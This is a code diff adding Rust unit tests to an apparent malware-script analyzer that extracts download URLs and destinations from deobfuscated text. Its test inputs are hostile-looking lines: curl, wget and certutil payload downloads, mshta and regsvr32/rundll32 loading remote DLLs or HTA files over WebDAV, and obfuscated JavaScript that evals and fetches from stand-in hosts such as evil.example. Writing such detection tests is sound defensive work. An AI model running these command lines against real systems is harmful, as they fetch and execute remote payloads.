+            "curl deob-text -LO remote-name destination not recovered: {:?}",
             env.traits
         );
     }
@@ -9923,6 +26531,27 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
         assert_eq!(
             generic_count, 0,
             "curl redirect URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_schemeless_redirect_in_deob_text_preserves_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl -s curl-redirect-schemeless.example/payload.bin > C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://curl-redirect-schemeless.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "schemeless curl redirect destination not preserved: {:?}",
             env.traits
         );
     }
@@ -10089,6 +26718,27 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn wget_schemeless_domain_path_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget wget-schemeless-deob.example/payload.bin -O C:\WINDOWS\payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://wget-schemeless-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\WINDOWS\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "no structured schemeless wget Download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn wget_short_o_glued_in_deob_text_emits_clean_destination() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -10105,6 +26755,199 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
         assert!(
             has,
             "wget -ODEST destination not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_lowercase_o_logfile_in_deob_text_is_not_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget -o wget.log https://wget-log-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("https://wget-log-deob.example/payload.bin", None)],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_lowercase_p_page_requisites_in_deob_text_is_not_destination_prefix() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget -p https://wget-page-deob.example/index.html"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("https://wget-page-deob.example/index.html", None)],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_glued_short_directory_prefix_in_deob_text_records_destination_prefix() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget -PC:\Temp https://wget-glued-prefix-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-glued-prefix-deob.example/payload.bin",
+                Some(r#"C:\Temp"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_clustered_short_directory_prefix_in_deob_text_records_destination_prefix() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget -qPC:\Temp https://wget-cluster-prefix-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-cluster-prefix-deob.example/payload.bin",
+                Some(r#"C:\Temp"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_short_option_cluster_in_deob_text_emits_clean_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget -qO C:\Temp\payload.bin https://wget-cluster-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-cluster-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "wget short-option cluster destination not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_long_output_document_spaced_in_deob_text_emits_clean_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget --no-check-certificate --output-document C:\Temp\stage.bin https://wget-output-document.example/stage.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-output-document.example/stage.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\stage.bin")
+            )
+        });
+        assert!(
+            has,
+            "wget --output-document DEST destination not recovered: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("wget-output-document.example"))
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "wget --output-document URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_attached_long_output_option_case_insensitive_in_deob_text() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget --OUTPUT-DOCUMENT=C:\Temp\upper.bin https://wget-upper-output-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-upper-output-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\upper.bin")
+            )
+        });
+        assert!(
+            has,
+            "wget uppercase attached --output-document not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_uppercase_long_header_in_deob_text_is_not_download_source() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget --HEADER http://wget-header-only-deob.example/ref --OUTPUT-DOCUMENT=NUL"#,
+            &mut env,
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://wget-header-only-deob.example/ref"
+                )
+            }),
+            "wget header URL was promoted as structured download: {:?}",
             env.traits
         );
     }
@@ -10211,6 +27054,144 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
             env.traits
         );
     }
+
+    #[test]
+    fn certutil_urlcache_slash_flag_after_url_in_deob_text_is_not_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Temp\cr.tmp -urlcache https://cert-deob.example/payload.exe /f C:\Temp\payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://cert-deob.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "certutil deob-text slash flag was parsed as destination: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_urlcache_slash_option_prefix_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Temp\cr.tmp /urlcache /split /f https://slash-cert-deob.example/payload.exe C:\Temp\payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://slash-cert-deob.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "slash-prefixed deob-text certutil urlcache was not extracted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_urlcache_schemeless_source_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Temp\cr.tmp -urlcache -split -f cert-schemeless-deob.example/payload.exe C:\Temp\payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "http://cert-schemeless-deob.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "schemeless certutil deob-text source was not structured: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_verifyctl_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Temp\cr.tmp -verifyctl -f https://certutil-verifyctl-deob.example/payload.cab C:\Temp\payload.cab"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://certutil-verifyctl-deob.example/payload.cab"
+                        && dst == "C:\\Temp\\payload.cab"
+            )
+        });
+        assert!(
+            has,
+            "certutil verifyctl deob-text source was not structured: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("certutil-verifyctl-deob.example"))
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "certutil verifyctl URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certutil_downloaded_hta_in_deob_text_resolves_mshta_source_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "certutil -urlcache -split -f https://certutil-mshta.example/payload.hta C:\\Temp\\payload.hta\r\nmshta C:\\Temp\\payload.hta",
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:\\Temp\\payload.hta"
+                            && url == "https://certutil-mshta.example/payload.hta"
+                )
+            }),
+            "certutil-downloaded HTA in deob text was not linked to mshta: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_long_directory_prefix_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget --directory-prefix=C:\Temp https://wget-prefix-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-prefix-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from wget --directory-prefix: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
@@ -10246,6 +27227,19 @@ mod unc_webdav_tests {
     }
 
     #[test]
+    fn unc_webdav_regsvr32_chain_emits_lolbas_trait() {
+        let script = br#"start powershell.exe -windowstyle hidden net use \\45.9.74.36@8888\davwwwroot\  regsvr32 /s \\45.9.74.36@8888\davwwwroot\163141239210479.dll"#;
+        let report = analyze(script, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Lolbas { name, cmd }
+                if name == "regsvr32" && cmd.contains(r#"\\45.9.74.36@8888\davwwwroot\163141239210479.dll"#)
+            )
+        });
+        assert!(has, "no regsvr32 LOLBAS trait: {:?}", report.traits);
+    }
+
+    #[test]
     fn unc_webdav_deduped_per_command() {
         // Same UNC server referenced twice in one line — emit only one trait per (host, port)
         let script = br#"net use \\45.9.74.36@8888\davwwwroot\ & rundll32 \\45.9.74.36@8888\davwwwroot\x.dll"#;
@@ -10260,6 +27254,46 @@ mod unc_webdav_tests {
             })
             .count();
         assert_eq!(count, 1, "expected 1 deduped trait, got {}", count);
+    }
+
+    #[test]
+    fn bare_webdav_share_rundll32_target_resolves_http_url() {
+        let script = br#"start rundll32 \\104.156.149.6\webdav\host.dll,XSSCheckStart"#;
+        let report = analyze(script, &Config::default());
+        let has_rundll = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Rundll32 { url: Some(url), .. }
+                if url == "http://104.156.149.6/webdav/host.dll"
+            )
+        });
+        assert!(
+            has_rundll,
+            "rundll32 bare WebDAV share URL was not resolved: {:?}",
+            report.traits
+        );
+        let null_rundll_count = report
+            .traits
+            .iter()
+            .filter(|t| matches!(t, Trait::Rundll32 { url: None, .. }))
+            .count();
+        assert_eq!(
+            null_rundll_count, 0,
+            "bare WebDAV rundll32 should not also emit a null URL row: {:?}",
+            report.traits
+        );
+        let has_unc = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UncWebDavC2 { host, port, http_url, .. }
+                if host == "104.156.149.6"
+                    && port == "80"
+                    && http_url == "http://104.156.149.6/webdav/host.dll"
+            )
+        });
+        assert!(
+            has_unc,
+            "bare WebDAV share was not surfaced as UncWebDavC2: {:?}",
+            report.traits
+        );
     }
 }
 
@@ -10560,6 +27594,34 @@ mod deob_scan_noise_filter_tests {
             "malformed raw.githubusercontent prefix not filtered: {:?}",
             report.traits
         );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlVariable { name, url, .. }
+                        if name == "SEVEN_ZIP_URL"
+                            && url == "https://raw.githubusercontent.com/example/repo/main/7z.exe"
+                )
+            }),
+            "terminal ampersand was not trimmed from URL variable: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src.ends_with('&')
+                ) || matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. } if src.ends_with('&')
+                ) || matches!(
+                    t,
+                    Trait::UrlVariable { url, .. } if url.ends_with('&')
+                )
+            }),
+            "terminal ampersand leaked into URL trait: {:?}",
+            report.traits
+        );
     }
 
     #[test]
@@ -10820,6 +27882,23 @@ mod ps_alias_tests {
     }
 
     #[test]
+    fn gate_allows_wget_curl_alias_only_payload() {
+        use crate::ps_alias::expand_aliases_if_ps;
+        let alias_only = "wget 'http://e.example/a'; curl 'http://e.example/b'";
+        let out = expand_aliases_if_ps(alias_only);
+        assert!(
+            out.contains("Invoke-WebRequest 'http://e.example/a'"),
+            "got: {}",
+            out
+        );
+        assert!(
+            out.contains("Invoke-WebRequest 'http://e.example/b'"),
+            "got: {}",
+            out
+        );
+    }
+
+    #[test]
     fn gate_allows_verb_noun_cmdlet() {
         use crate::ps_alias::expand_aliases_if_ps;
         let with_cmdlet = "Get-Item foo; start bar";
@@ -10860,6 +27939,53 @@ mod ps_alias_tests {
         assert!(
             out.contains("Write-Output $line"),
             "echo alias missed: {}",
+            out
+        );
+    }
+
+    #[test]
+    fn quoted_literals_are_not_expanded_as_aliases() {
+        let input = "$cmd = ('h') + ('iwr') + \"curl\"; iwr http://e.example/p";
+        let out = expand_aliases(input);
+
+        assert!(
+            out.contains("('h') + ('iwr') + \"curl\""),
+            "alias expansion rewrote quoted literal text: {}",
+            out
+        );
+        assert!(
+            out.contains("Invoke-WebRequest http://e.example/p"),
+            "command-position alias was not expanded: {}",
+            out
+        );
+    }
+
+    #[test]
+    fn aliases_inside_long_quoted_literals_are_not_expanded() {
+        let input = "$ua = 'Mozilla/5.0 Firefox/150.0 rv:150.0'; rv $ua";
+        let out = expand_aliases(input);
+
+        assert!(
+            out.contains("Firefox/150.0 rv:150.0"),
+            "alias expansion rewrote quoted user-agent text: {}",
+            out
+        );
+        assert!(
+            out.contains("Remove-Variable $ua"),
+            "command-position alias was not expanded: {}",
+            out
+        );
+
+        let unquoted_colon = "$ua = rv:150.0; rv $ua";
+        let out = expand_aliases(unquoted_colon);
+        assert!(
+            out.contains("rv:150.0"),
+            "alias expansion rewrote colon-suffixed token: {}",
+            out
+        );
+        assert!(
+            out.contains("Remove-Variable $ua"),
+            "command-position alias was not expanded: {}",
             out
         );
     }
@@ -10928,6 +28054,20 @@ mod certutil_decoded_js_tests {
         assert!(
             urls.iter().any(|u| u == "https://evil.example/?1/"),
             "expected https://evil.example/?1/ in {:?}",
+            urls
+        );
+    }
+
+    #[test]
+    fn slash_decode_split_string_getobject_url_extracted() {
+        let plain =
+            r#"var a="sc"+"r";b="ipt:h";c="T"+"tP"+":";GetObject(a+b+c+"//slash-js.example/?1/");"#;
+        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, plain);
+        let deob = format!("echo {b64} > f.js\ncertutil /f /decode f.js f.js\ncall f.js\n");
+        let urls = extract(&deob);
+        assert!(
+            urls.iter().any(|u| u == "https://slash-js.example/?1/"),
+            "expected slash-form decoded JS URL in {:?}",
             urls
         );
     }
@@ -11348,6 +28488,256 @@ mod js_url_extraction_tests {
             )
         });
         assert!(has, "hex-escape URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_string_line_continuation_joins_url() {
+        let mut env = Environment::new(&Config::default());
+        let js = b"fetch(\"https://js-line-cont.example/sta\\\r\nge\")".to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://js-line-cont.example/stage"
+                )
+            }),
+            "JS line-continuation URL was not joined: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_run_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"new ActiveXObject("WScript.Shell").Run("mshta js-run.example/payload.hta");"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "http://js-run.example/payload.hta"
+                )
+            }),
+            "JS WScript.Shell.Run schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_lowercase_run_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"new ActiveXObject("WScript.Shell").run("mshta js-lower-run.example/payload.hta");"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://js-lower-run.example/payload.hta"
+                )
+            }),
+            "JS WScript.Shell lowercase run schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_run_variable_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var cmd = "mshta js-run-var.example/payload.hta";
+new ActiveXObject("WScript.Shell").Run(cmd);"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://js-run-var.example/payload.hta"
+                )
+            }),
+            "JS WScript.Shell.Run variable schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_run_array_join_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"new ActiveXObject("WScript.Shell").Run(["mshta ","js-run-array.example/payload.hta"].join(""));"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://js-run-array.example/payload.hta"
+                )
+            }),
+            "JS WScript.Shell.Run array-join schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_bracket_run_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"new ActiveXObject("WScript.Shell")["Run"]("mshta js-bracket-run.example/payload.hta");"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://js-bracket-run.example/payload.hta"
+                )
+            }),
+            "JS WScript.Shell bracket Run schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_non_wsh_bracket_run_does_not_emit_download() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var task = {};
+task["Run"]("mshta js-bracket-run-fp.example/payload.hta");"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://js-bracket-run-fp.example/payload.hta"
+                )
+            }),
+            "generic JS bracket Run should not be treated as WSH execution: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_exec_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"new ActiveXObject("WScript.Shell").Exec("mshta js-exec.example/payload.hta");"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "http://js-exec.example/payload.hta"
+                )
+            }),
+            "JS WScript.Shell.Exec schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_shellexecute_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"new ActiveXObject("WScript.Shell").ShellExecute("mshta", "js-shellexecute.example/payload.hta", "", "open", 0);"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://js-shellexecute.example/payload.hta"
+                )
+            }),
+            "JS WScript.Shell.ShellExecute schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_bracket_shellexecute_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"new ActiveXObject("WScript.Shell")["ShellExecute"]("mshta", "js-bracket-shellexecute.example/payload.hta", "", "open", 0);"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://js-bracket-shellexecute.example/payload.hta"
+                )
+            }),
+            "JS WScript.Shell bracket ShellExecute schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_shell_application_shellexecute_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"WScript.CreateObject("Shell.Application").ShellExecute("mshta", "js-shell-application.example/payload.hta", "", "open", 0);"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://js-shell-application.example/payload.hta"
+                )
+            }),
+            "JS Shell.Application.ShellExecute schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_fromcodepoint_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"eval(String.fromCodePoint(104,116,116,112,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,120))"#.to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://evil.example/x"
+            )
+        });
+        assert!(has, "fromCodePoint URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_fromcodepoint_member_variable_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var m="fromCodePoint"; eval(String[m](104,116,116,112,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,121))"#.to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://evil.example/y"
+            )
+        });
+        assert!(has, "fromCodePoint member URL missed: {:?}", env.traits);
     }
 
     #[test]
@@ -11804,6 +29194,29 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_fromcharcode_xor_expression_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let chars = "https://char-xor-js.example/p"
+            .bytes()
+            .map(|b| format!("0x{:x}^0x55^0x55", b))
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!("var u = String.fromCharCode({chars}); eval(u)").into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://char-xor-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS fromCharCode xor expression URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_bracket_fromcharcode_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let chars = "https://char-bracket-js.example/p"
@@ -11917,6 +29330,31 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_fromcharcode_apply_inline_uint8array_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let chars = "https://char-apply-inline-uint8array-js.example/p"
+            .bytes()
+            .map(|b| b.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js =
+            format!("var u = String.fromCharCode.apply(null, new Uint8Array([{chars}])); eval(u)")
+                .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://char-apply-inline-uint8array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS fromCharCode.apply inline Uint8Array URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_fromcharcode_apply_array_variable_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let chars = "https://char-apply-var-js.example/p"
@@ -11961,6 +29399,32 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS fromCharCode.apply array constructor variable URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_fromcharcode_apply_uint8array_variable_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let chars = "https://char-apply-uint8array-var-js.example/p"
+            .bytes()
+            .map(|b| b.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(
+            "var a = new Uint8Array([{chars}]); var u = String.fromCharCode.apply(null, a); eval(u)"
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://char-apply-uint8array-var-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS fromCharCode.apply Uint8Array variable URL missed: {:?}",
             env.traits
         );
     }
@@ -12080,6 +29544,51 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_fromcharcode_bind_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let chars = "https://char-bind-js.example/p"
+            .bytes()
+            .map(|b| b.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!("var u = String.fromCharCode.bind(String)({chars}); eval(u)").into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://char-bind-js.example/p"
+            )
+        });
+        assert!(has, "JS fromCharCode.bind URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_variable_member_fromcharcode_bind_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let chars = "https://char-member-var-bind-js.example/p"
+            .bytes()
+            .map(|b| b.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(
+            r#"var m = "from" + "CharCode"; var u = String[m].bind(String)({chars}); eval(u)"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://char-member-var-bind-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS variable member fromCharCode.bind URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_variable_member_fromcharcode_call_url_extracted() {
         let mut env = Environment::new(&Config::default());
